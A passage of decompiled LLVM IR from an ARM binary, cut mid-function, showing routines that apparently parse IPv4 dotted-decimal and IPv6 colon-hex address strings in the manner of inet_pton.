  %v2_15e4c = load i16, i16* %v1_15e4c, align 2
  %v3_15e4c = zext i16 %v2_15e4c to i32
  store i32 %v3_15e4c, i32* %r3.global-to-local, align 4
  %v1_15e50 = add i32 %v0_15e4c, 8
  %v2_15e50 = inttoptr i32 %v1_15e50 to i32*
  %v3_15e50 = load i32, i32* %v2_15e50, align 4
  %v1_15e54 = and i32 %v3_15e4c, 65471
  store i32 %v1_15e54, i32* %r3.global-to-local, align 4
  %v2_15e58 = add i32 %v0_15e4c, 28
  %v3_15e58 = inttoptr i32 %v2_15e58 to i32*
  store i32 %v3_15e50, i32* %v3_15e58, align 4
  %v0_15e5c = load i32, i32* %r3.global-to-local, align 4
  %v1_15e5c = trunc i32 %v0_15e5c to i16
  %v2_15e5c = load i32, i32* @r4, align 4
  %v3_15e5c = inttoptr i32 %v2_15e5c to i16*
  store i16 %v1_15e5c, i16* %v3_15e5c, align 2
  %v0_15e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15e60

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15e38, %dec_label_pc_15e4c
  %v2_15e68 = phi i32 [ %v0_15e0c, %dec_label_pc_15e38 ], [ %v0_15e60.pre, %dec_label_pc_15e4c ]
  %v1_15e60 = inttoptr i32 %v2_15e68 to i16*
  %v2_15e60 = load i16, i16* %v1_15e60, align 2
  %v3_15e60 = zext i16 %v2_15e60 to i32
  %v1_15e64 = or i32 %v3_15e60, 1
  store i32 %v1_15e64, i32* %r3.global-to-local, align 4
  %v1_15e68 = trunc i32 %v1_15e64 to i16
  store i16 %v1_15e68, i16* %v1_15e60, align 2
  %v0_15e6c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15e6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e24, %dec_label_pc_15e60
  %v1_15e78 = phi i32 [ %v1_15e78.pre, %dec_label_pc_15e24 ], [ %v0_15e6c, %dec_label_pc_15e60 ]
  %v2_15e74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15e74, i32* @r4, align 4
  ret i32 %v1_15e78

; uselistorder directives
  uselistorder i32 %v3_15de8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @function_dc5c, { 2, 5, 4, 3, 7, 6, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_15e70, { 1, 0 }
  uselistorder label %dec_label_pc_15e60, { 1, 0 }
  uselistorder label %dec_label_pc_15e18, { 1, 0 }
  uselistorder label %dec_label_pc_15e0c, { 1, 0 }
}

define i32 @function_15e7c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15e7c:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_15e88 = load i32, i32* %arg2, align 4
  %v3_15e88 = add i32 %tmp, 4
  %v4_15e88 = inttoptr i32 %v3_15e88 to i32*
  %v5_15e88 = load i32, i32* %v4_15e88, align 4
  %v1_15e8c = add i32 %arg1, 4
  %v2_15e8c = inttoptr i32 %v1_15e8c to i32*
  %v3_15e8c = load i32, i32* %v2_15e8c, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_15e94 = call i32 @function_178a0(i32 %v3_15e8c, i32 %tmp, i32 %v2_15e88, i32 %v5_15e88)
  %v1_15e98 = icmp slt i32* %arg2, null
  br i1 %v1_15e98, label %bb13, label %bb

bb:                                               ; preds = %dec_label_pc_15e7c
  %v3_15ea05 = load i32, i32* @r4, align 4
  %v4_15ea06 = inttoptr i32 %v3_15ea05 to i32*
  store i32 %v4_15e94, i32* %v4_15ea06, align 4
  %v6_15ea07 = add i32 %v3_15ea05, 4
  %v7_15ea08 = inttoptr i32 %v6_15ea07 to i32*
  store i32 %tmp, i32* %v7_15ea08, align 4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_15e7c, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_15e94, %dec_label_pc_15e7c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @function_15eb8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15eb8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15eb8 = load i32, i32* @r4, align 4
  %v6_15eb8 = load i32, i32* @r5, align 4
  %v15_15eb8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_15ed0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15ed0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_15f481 = load i32, i32* @r0, align 4
  %v1_15f482 = inttoptr i32 %v0_15f481 to i8*
  %v2_15f483 = load i8, i8* %v1_15f482, align 1
  %v3_15f484 = zext i8 %v2_15f483 to i32
  store i32 %v3_15f484, i32* @r3, align 4
  %v2_15f4c5 = icmp eq i8 %v2_15f483, 0
  store i1 %v2_15f4c5, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f4c5, label %dec_label_pc_15f58, label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %dec_label_pc_15eb8, %dec_label_pc_15f48.backedge
  %v0_15eec = phi i32 [ %v0_15f48, %dec_label_pc_15f48.backedge ], [ %v0_15f481, %dec_label_pc_15eb8 ]
  %v0_15f24 = phi i32 [ %v3_15f48, %dec_label_pc_15f48.backedge ], [ %v3_15f484, %dec_label_pc_15eb8 ]
  %v2_15ef8.in = phi i32 [ %v3_15f48, %dec_label_pc_15f48.backedge ], [ %v3_15f484, %dec_label_pc_15eb8 ]
  %v2_15ef8 = add nsw i32 %v2_15ef8.in, -48
  %v2_15ee8 = icmp ugt i32 %v2_15ef8, 8
  %v7_15ee8 = icmp eq i32 %v2_15ef8, 9
  store i1 %v7_15ee8, i1* %cpsr_z.global-to-local, align 1
  %v1_15eec = add i32 %v0_15eec, 1
  store i32 %v1_15eec, i32* %r0.global-to-local, align 4
  %v2_15ef0 = xor i1 %v7_15ee8, true
  %v3_15ef0 = and i1 %v2_15ee8, %v2_15ef0
  br i1 %v3_15ef0, label %dec_label_pc_15f24, label %dec_label_pc_15ef4

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15ee8
  %v0_15ef4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ef4 = inttoptr i32 %v0_15ef4 to i8*
  %v2_15ef4 = load i8, i8* %v1_15ef4, align 1
  %v3_15ef4 = zext i8 %v2_15ef4 to i32
  %v0_15ef8 = load i32, i32* %r7.global-to-local, align 4
  %v3_15ef8 = mul i32 %v0_15ef8, %v3_15ef4
  %v4_15ef8 = add i32 %v3_15ef8, %v2_15ef8
  store i32 %v4_15ef8, i32* @r3, align 4
  %v2_15efc = icmp ugt i32 %v4_15ef8, 254
  %v7_15efc = icmp eq i32 %v4_15ef8, 255
  store i1 %v7_15efc, i1* %cpsr_z.global-to-local, align 1
  %v2_15f00 = xor i1 %v7_15efc, true
  %v3_15f00 = and i1 %v2_15efc, %v2_15f00
  br i1 %v3_15f00, label %dec_label_pc_15f7c, label %dec_label_pc_15f04

dec_label_pc_15f04:                               ; preds = %dec_label_pc_15ef4
  %v0_15f04 = load i32, i32* @lr, align 4
  %v2_15f04 = icmp eq i32 %v0_15f04, 0
  store i1 %v2_15f04, i1* %cpsr_z.global-to-local, align 1
  %v1_15f08 = trunc i32 %v4_15ef8 to i8
  store i8 %v1_15f08, i8* %v1_15ef4, align 1
  %v0_15f0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15f0c, label %dec_label_pc_15f10, label %dec_label_pc_15f48.backedge

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15f04
  %v0_15f10 = load i32, i32* @ip, align 4
  %v1_15f10 = add i32 %v0_15f10, 1
  store i32 %v1_15f10, i32* @ip, align 4
  %v7_15f14 = icmp eq i32 %v1_15f10, 4
  store i1 %v7_15f14, i1* %cpsr_z.global-to-local, align 1
  %v0_15f18 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15f18, i32* @lr, align 4
  %v8_15f1c = icmp sgt i32 %v1_15f10, 4
  br i1 %v8_15f1c, label %dec_label_pc_15f7c, label %dec_label_pc_15f48.backedge

dec_label_pc_15f24:                               ; preds = %dec_label_pc_15ee8
  %v7_15f24 = icmp eq i32 %v0_15f24, 46
  %v1_15f2c = load i32, i32* @lr, align 4
  %v2_15f2c = urem i32 %v1_15f2c, 2
  %storemerge12 = select i1 %v7_15f24, i32 %v2_15f2c, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_15f30 = icmp eq i32 %storemerge12, 0
  store i1 %v2_15f30, i1* %cpsr_z.global-to-local, align 1
  %v0_15f34 = load i32, i32* @r5, align 4
  store i32 %v0_15f34, i32* @lr, align 4
  br i1 %v2_15f30, label %dec_label_pc_15f7c, label %dec_label_pc_15f3c

dec_label_pc_15f3c:                               ; preds = %dec_label_pc_15f24
  %v0_15f3c = load i32, i32* @ip, align 4
  %v7_15f3c = icmp eq i32 %v0_15f3c, 4
  store i1 %v7_15f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f3c, label %dec_label_pc_15f7c, label %dec_label_pc_15f44

dec_label_pc_15f44:                               ; preds = %dec_label_pc_15f3c
  %v1_15f44 = trunc i32 %v0_15f34 to i8
  %v2_15f44 = load i32, i32* %r1.global-to-local, align 4
  %v3_15f44 = add i32 %v2_15f44, 1
  %v4_15f44 = inttoptr i32 %v3_15f44 to i8*
  store i8 %v1_15f44, i8* %v4_15f44, align 1
  %v5_15f44 = load i32, i32* %r1.global-to-local, align 4
  %v6_15f44 = add i32 %v5_15f44, 1
  store i32 %v6_15f44, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f48.backedge

dec_label_pc_15f48.backedge:                      ; preds = %dec_label_pc_15f44, %dec_label_pc_15f04, %dec_label_pc_15f10
  %v0_15f48 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f48 = inttoptr i32 %v0_15f48 to i8*
  %v2_15f48 = load i8, i8* %v1_15f48, align 1
  %v3_15f48 = zext i8 %v2_15f48 to i32
  store i32 %v3_15f48, i32* @r3, align 4
  %v2_15f4c = icmp eq i8 %v2_15f48, 0
  store i1 %v2_15f4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15f4c, label %dec_label_pc_15f48.dec_label_pc_15f58_crit_edge, label %dec_label_pc_15ee8

dec_label_pc_15f48.dec_label_pc_15f58_crit_edge:  ; preds = %dec_label_pc_15f48.backedge
  %v0_15f58.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15f58

dec_label_pc_15f58:                               ; preds = %dec_label_pc_15f48.dec_label_pc_15f58_crit_edge, %dec_label_pc_15eb8
  %v0_15f58 = phi i32 [ %v0_15f58.pre, %dec_label_pc_15f48.dec_label_pc_15f58_crit_edge ], [ 0, %dec_label_pc_15eb8 ]
  %v7_15f58 = icmp eq i32 %v0_15f58, 3
  store i1 %v7_15f58, i1* %cpsr_z.global-to-local, align 1
  %v7_15f5c = icmp slt i32 %v0_15f58, 4
  br i1 %v7_15f5c, label %dec_label_pc_15f7c, label %dec_label_pc_15f60

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f58
  %v0_15f60 = load i32, i32* @r4, align 4
  store i32 %v0_15f60, i32* @r0, align 4
  store i32 %v2_15ed0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_15f6c = call i32 @function_f700()
  br label %dec_label_pc_15f7c

dec_label_pc_15f7c:                               ; preds = %dec_label_pc_15ef4, %dec_label_pc_15f10, %dec_label_pc_15f24, %dec_label_pc_15f3c, %dec_label_pc_15f58, %dec_label_pc_15f60
  %storemerge = phi i32 [ 1, %dec_label_pc_15f60 ], [ 0, %dec_label_pc_15f58 ], [ 0, %dec_label_pc_15f3c ], [ 0, %dec_label_pc_15f24 ], [ 0, %dec_label_pc_15f10 ], [ 0, %dec_label_pc_15ef4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_15eb8, i32* @r4, align 4
  store i32 %v6_15eb8, i32* @r5, align 4
  store i32 %v15_15eb8, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_15f58, { 1, 0 }
  uselistorder i32 %v3_15f48, { 2, 1, 0 }
  uselistorder i32 %v0_15f48, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_15ef8, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_15f7c, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15f48.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15ee8, { 1, 0 }
}

define i32 @function_15f88(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15f88:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %v3_15f88 = load i32, i32* @r4, align 4
  %v6_15f88 = load i32, i32* @r5, align 4
  %v9_15f88 = load i32, i32* @r6, align 4
  %v12_15f88 = load i32, i32* @r7, align 4
  %v27_15f88 = load i32, i32* @lr, align 4
  %v7_15f94 = icmp eq i32 %arg1, 2
  store i32 142964, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_15f94, label %dec_label_pc_15fb4, label %dec_label_pc_15fa8

dec_label_pc_15fa8:                               ; preds = %dec_label_pc_15f88
  %v7_15fa8 = icmp eq i32 %arg1, 10
  br i1 %v7_15fa8, label %dec_label_pc_15fc4, label %dec_label_pc_1617c

dec_label_pc_15fb4:                               ; preds = %dec_label_pc_15f88
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_15fbc = call i32 @function_15eb8(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1618c

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_15fa8
  %v2_15fc4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_15fd0 = bitcast i32* %stack_var_-56 to i8*
  %v3_15fd0 = call i32 @function_f5d0(i8* %v2_15fd0, i32 0)
  %v0_15fd4 = load i32, i32* @r5, align 4
  %v1_15fd4 = inttoptr i32 %v0_15fd4 to i8*
  %v2_15fd4 = load i8, i8* %v1_15fd4, align 1
  %v3_15fd4 = zext i8 %v2_15fd4 to i32
  store i32 %v3_15fd4, i32* %r3.global-to-local, align 4
  %v7_15fd8 = icmp eq i8 %v2_15fd4, 58
  store i32 %v3_15fd0, i32* @r6, align 4
  %v2_15fe0 = add i32 %v3_15fd0, 16
  store i32 %v2_15fe0, i32* %r8.global-to-local, align 4
  br i1 %v7_15fd8, label %dec_label_pc_15fe8, label %dec_label_pc_15ff4

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fc4
  %v1_15fe8 = add i32 %v0_15fd4, 1
  %v2_15fe8 = inttoptr i32 %v1_15fe8 to i8*
  %v3_15fe8 = load i8, i8* %v2_15fe8, align 1
  %v4_15fe8 = zext i8 %v3_15fe8 to i32
  store i32 %v4_15fe8, i32* %r3.global-to-local, align 4
  store i32 %v1_15fe8, i32* @r5, align 4
  %v7_15fec = icmp eq i8 %v3_15fe8, 58
  br i1 %v7_15fec, label %dec_label_pc_15ff4, label %dec_label_pc_16174

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fe8, %dec_label_pc_15fc4
  %v0_16000 = phi i32 [ %v1_15fe8, %dec_label_pc_15fe8 ], [ %v0_15fd4, %dec_label_pc_15fc4 ]
  store i32 -32952, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_16000, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1adbc.652, i32 0, i32 0), i8** %stack_var_-64, align 4
  %v1_160d83 = inttoptr i32 %v0_16000 to i8*
  %v2_160d84 = load i8, i8* %v1_160d83, align 1
  %v3_160d85 = zext i8 %v2_160d84 to i32
  store i32 %v3_160d85, i32* @r4, align 4
  %v2_160dc6 = icmp eq i8 %v2_160d84, 0
  br i1 %v2_160dc6, label %dec_label_pc_160e4.thread, label %dec_label_pc_16014

dec_label_pc_160e4.thread:                        ; preds = %dec_label_pc_15ff4
  store i32 %v3_15fd0, i32* @r4, align 4
  br label %dec_label_pc_16110

dec_label_pc_16014:                               ; preds = %dec_label_pc_15ff4, %dec_label_pc_160d8.backedge.dec_label_pc_16014_crit_edge
  %v0_16018 = phi i32 [ %v3_160d8, %dec_label_pc_160d8.backedge.dec_label_pc_16014_crit_edge ], [ %v3_160d85, %dec_label_pc_15ff4 ]
  %v2_16014 = phi i8* [ %v2_16014.pre, %dec_label_pc_160d8.backedge.dec_label_pc_16014_crit_edge ], [ getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1adbc.652, i32 0, i32 0), %dec_label_pc_15ff4 ]
  %v3_16014 = ptrtoint i8* %v2_16014 to i32
  store i32 %v3_16014, i32* @r0, align 4
  %v1_16018 = or i32 %v0_16018, 32
  store i32 %v1_16018, i32* %r1.global-to-local, align 4
  %v3_1601c = call i32 @function_15078(i32 %v3_16014, i32 %v1_16018)
  %v2_16020 = icmp eq i32 %v3_1601c, 0
  %v0_16024 = load i32, i32* @r5, align 4
  %v1_16024 = add i32 %v0_16024, 1
  store i32 %v1_16024, i32* @r5, align 4
  br i1 %v2_16020, label %dec_label_pc_16048, label %dec_label_pc_1602c

dec_label_pc_1602c:                               ; preds = %dec_label_pc_16014
  %v2_1602c = load i8*, i8** %stack_var_-64, align 4
  %v3_1602c = ptrtoint i8* %v2_1602c to i32
  store i32 %v3_1602c, i32* %r2.global-to-local, align 4
  %v2_16030 = sub i32 %v3_1601c, %v3_1602c
  %v1_16034 = load i32, i32* @r7, align 4
  %v4_16034 = mul i32 %v1_16034, 16
  %v5_16034 = or i32 %v4_16034, %v2_16030
  store i32 %v5_16034, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_ffff.530 to i32), i32* @r3, align 4
  %tmp35 = icmp ugt i32 %v5_16034, ptrtoint (i32* @global_var_ffff.530 to i32)
  br i1 %tmp35, label %dec_label_pc_16174, label %dec_label_pc_160d4

dec_label_pc_16048:                               ; preds = %dec_label_pc_16014
  %v0_16048 = load i32, i32* @r4, align 4
  %v7_16048 = icmp eq i32 %v0_16048, 58
  br i1 %v7_16048, label %dec_label_pc_16050, label %dec_label_pc_160a8

dec_label_pc_16050:                               ; preds = %dec_label_pc_16048
  %v0_16050 = load i32, i32* %sb.global-to-local, align 4
  %v2_16050 = icmp eq i32 %v0_16050, 0
  br i1 %v2_16050, label %dec_label_pc_16058, label %dec_label_pc_1606c

dec_label_pc_16058:                               ; preds = %dec_label_pc_16050
  %v0_16058 = load i32, i32* %fp.global-to-local, align 4
  %v2_16058 = icmp eq i32 %v0_16058, 0
  br i1 %v2_16058, label %dec_label_pc_16060, label %dec_label_pc_16174

dec_label_pc_16060:                               ; preds = %dec_label_pc_16058
  %v0_16060 = load i32, i32* @r6, align 4
  store i32 %v0_16060, i32* %fp.global-to-local, align 4
  store i32 %v1_16024, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_160d8.backedge

dec_label_pc_1606c:                               ; preds = %dec_label_pc_16050
  %v1_1606c = inttoptr i32 %v1_16024 to i8*
  %v2_1606c = load i8, i8* %v1_1606c, align 1
  %v3_1606c = zext i8 %v2_1606c to i32
  store i32 %v3_1606c, i32* %r3.global-to-local, align 4
  %v2_16070 = icmp eq i8 %v2_1606c, 0
  br i1 %v2_16070, label %dec_label_pc_16174, label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_1606c
  %v0_16078 = load i32, i32* @r6, align 4
  %v1_16078 = add i32 %v0_16078, 2
  store i32 %v1_16078, i32* %r3.global-to-local, align 4
  %v1_1607c = load i32, i32* %r8.global-to-local, align 4
  %tmp36 = icmp ugt i32 %v1_16078, %v1_1607c
  br i1 %tmp36, label %dec_label_pc_16174, label %dec_label_pc_16084

dec_label_pc_16084:                               ; preds = %dec_label_pc_16078
  %v0_16084 = load i32, i32* @r7, align 4
  %v3_16084 = udiv i32 %v0_16084, 256
  store i32 %v3_16084, i32* %r2.global-to-local, align 4
  store i32 %v0_16078, i32* %r3.global-to-local, align 4
  %v1_1608c = trunc i32 %v3_16084 to i8
  %v3_1608c = inttoptr i32 %v0_16078 to i8*
  store i8 %v1_1608c, i8* %v3_1608c, align 1
  %v4_1608c = load i32, i32* %r3.global-to-local, align 4
  %v5_1608c = add i32 %v4_1608c, 1
  store i32 %v5_1608c, i32* @r3, align 4
  %v0_16090 = load i32, i32* @r7, align 4
  %v1_16090 = trunc i32 %v0_16090 to i8
  %v2_16090 = load i32, i32* @r6, align 4
  %v3_16090 = add i32 %v2_16090, 1
  %v4_16090 = inttoptr i32 %v3_16090 to i8*
  store i8 %v1_16090, i8* %v4_16090, align 1
  store i32 0, i32* @r7, align 4
  %v0_16098 = load i32, i32* @r3, align 4
  %v1_16098 = add i32 %v0_16098, 1
  store i32 %v1_16098, i32* @r6, align 4
  %v0_1609c = load i32, i32* @r5, align 4
  store i32 %v0_1609c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_160d8.backedge

dec_label_pc_160a8:                               ; preds = %dec_label_pc_16048
  %v7_160a8 = icmp eq i32 %v0_16048, 46
  br i1 %v7_160a8, label %dec_label_pc_160b0, label %dec_label_pc_16174

dec_label_pc_160b0:                               ; preds = %dec_label_pc_160a8
  %v0_160b0 = load i32, i32* @r6, align 4
  %v1_160b0 = add i32 %v0_160b0, 4
  store i32 %v1_160b0, i32* @r4, align 4
  %v1_160b4 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_160b0, %v1_160b4
  br i1 %tmp37, label %dec_label_pc_16174, label %dec_label_pc_160bc

dec_label_pc_160bc:                               ; preds = %dec_label_pc_160b0
  %v0_160bc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_160bc, i32* @r0, align 4
  store i32 %v0_160b0, i32* %r1.global-to-local, align 4
  %v3_160c4 = call i32 @function_15eb8(i32 %v0_160bc, i32 %v0_160b0)
  %v5_160cc = icmp sgt i32 %v3_160c4, 0
  br i1 %v5_160cc, label %dec_label_pc_160bc.dec_label_pc_16110_crit_edge, label %dec_label_pc_16174

dec_label_pc_160bc.dec_label_pc_16110_crit_edge:  ; preds = %dec_label_pc_160bc
  %v0_16154.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16110

dec_label_pc_160d4:                               ; preds = %dec_label_pc_1602c
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_160d8.backedge

dec_label_pc_160d8.backedge:                      ; preds = %dec_label_pc_160d4, %dec_label_pc_16060, %dec_label_pc_16084
  %v0_160d8 = phi i32 [ %v1_16024, %dec_label_pc_160d4 ], [ %v1_16024, %dec_label_pc_16060 ], [ %v0_1609c, %dec_label_pc_16084 ]
  %v0_160e412 = phi i32 [ 1, %dec_label_pc_160d4 ], [ 0, %dec_label_pc_16060 ], [ 0, %dec_label_pc_16084 ]
  %v1_160d8 = inttoptr i32 %v0_160d8 to i8*
  %v2_160d8 = load i8, i8* %v1_160d8, align 1
  %v3_160d8 = zext i8 %v2_160d8 to i32
  store i32 %v3_160d8, i32* @r4, align 4
  %v2_160dc = icmp eq i8 %v2_160d8, 0
  br i1 %v2_160dc, label %dec_label_pc_160e4, label %dec_label_pc_160d8.backedge.dec_label_pc_16014_crit_edge

dec_label_pc_160d8.backedge.dec_label_pc_16014_crit_edge: ; preds = %dec_label_pc_160d8.backedge
  %v2_16014.pre = load i8*, i8** %stack_var_-64, align 4
  br label %dec_label_pc_16014

dec_label_pc_160e4:                               ; preds = %dec_label_pc_160d8.backedge
  %v0_160e8.pre = load i32, i32* @r6, align 4
  %v2_160e4 = icmp eq i32 %v0_160e412, 0
  store i32 %v0_160e8.pre, i32* @r4, align 4
  br i1 %v2_160e4, label %dec_label_pc_16110, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160e4
  %v1_160f0 = add i32 %v0_160e8.pre, 2
  store i32 %v1_160f0, i32* %r3.global-to-local, align 4
  %v1_160f4 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_160f0, %v1_160f4
  br i1 %tmp38, label %dec_label_pc_16174, label %dec_label_pc_160fc

dec_label_pc_160fc:                               ; preds = %dec_label_pc_160f0
  store i32 %v0_160e8.pre, i32* %r3.global-to-local, align 4
  %v0_16100 = load i32, i32* @r7, align 4
  %v3_16100 = udiv i32 %v0_16100, 256
  store i32 %v3_16100, i32* %r2.global-to-local, align 4
  %v1_16104 = trunc i32 %v3_16100 to i8
  %v3_16104 = inttoptr i32 %v0_160e8.pre to i8*
  store i8 %v1_16104, i8* %v3_16104, align 1
  %v4_16104 = load i32, i32* %r3.global-to-local, align 4
  %v5_16104 = add i32 %v4_16104, 1
  store i32 %v5_16104, i32* @r3, align 4
  %v0_16108 = load i32, i32* @r7, align 4
  %v1_16108 = trunc i32 %v0_16108 to i8
  %v2_16108 = load i32, i32* @r6, align 4
  %v3_16108 = add i32 %v2_16108, 1
  %v4_16108 = inttoptr i32 %v3_16108 to i8*
  store i8 %v1_16108, i8* %v4_16108, align 1
  %v0_1610c = load i32, i32* @r3, align 4
  %v1_1610c = add i32 %v0_1610c, 1
  store i32 %v1_1610c, i32* @r4, align 4
  br label %dec_label_pc_16110

dec_label_pc_16110:                               ; preds = %dec_label_pc_160bc.dec_label_pc_16110_crit_edge, %dec_label_pc_160e4.thread, %dec_label_pc_160e4, %dec_label_pc_160fc
  %v0_16154.pre = phi i32 [ %v0_16154.pre.pre, %dec_label_pc_160bc.dec_label_pc_16110_crit_edge ], [ %v3_15fd0, %dec_label_pc_160e4.thread ], [ %v0_160e8.pre, %dec_label_pc_160e4 ], [ %v1_1610c, %dec_label_pc_160fc ]
  %v0_16110 = load i32, i32* %fp.global-to-local, align 4
  %v2_16110 = icmp eq i32 %v0_16110, 0
  %v1_16154.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_16110, label %dec_label_pc_16154, label %dec_label_pc_16118

dec_label_pc_16118:                               ; preds = %dec_label_pc_16110
  %v9_16118 = icmp eq i32 %v0_16154.pre, %v1_16154.pre
  %v2_1611c = sub i32 %v0_16154.pre, %v0_16110
  store i32 %v2_1611c, i32* @ip, align 4
  br i1 %v9_16118, label %dec_label_pc_16174, label %dec_label_pc_1613c.preheader

dec_label_pc_1613c.preheader:                     ; preds = %dec_label_pc_16118
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1613c

dec_label_pc_16130:                               ; preds = %dec_label_pc_1613c
  %v2_16144 = sub i32 %v0_16150, %v0_16148
  %v0_16130 = load i32, i32* %fp.global-to-local, align 4
  %v2_16130 = add i32 %v0_16130, %v2_16140
  %v3_16130 = inttoptr i32 %v2_16130 to i8*
  %v4_16130 = load i8, i8* %v3_16130, align 1
  %v6_16130 = zext i8 %v4_16130 to i32
  store i32 %v6_16130, i32* @r3, align 4
  %v3_16134 = inttoptr i32 %v2_16144 to i8*
  store i8 %v4_16130, i8* %v3_16134, align 1
  %v0_16138 = load i32, i32* @lr, align 4
  %v1_16138 = trunc i32 %v0_16138 to i8
  %v2_16138 = load i32, i32* %fp.global-to-local, align 4
  %v3_16138 = load i32, i32* %r1.global-to-local, align 4
  %v4_16138 = add i32 %v3_16138, %v2_16138
  %v5_16138 = inttoptr i32 %v4_16138 to i8*
  store i8 %v1_16138, i8* %v5_16138, align 1
  %v0_1613c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1613c.pre = load i32, i32* @ip, align 4
  %v1_16144.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1613c

dec_label_pc_1613c:                               ; preds = %dec_label_pc_1613c.preheader, %dec_label_pc_16130
  %v0_16150 = phi i32 [ %v1_16154.pre, %dec_label_pc_1613c.preheader ], [ %v1_16144.pre, %dec_label_pc_16130 ]
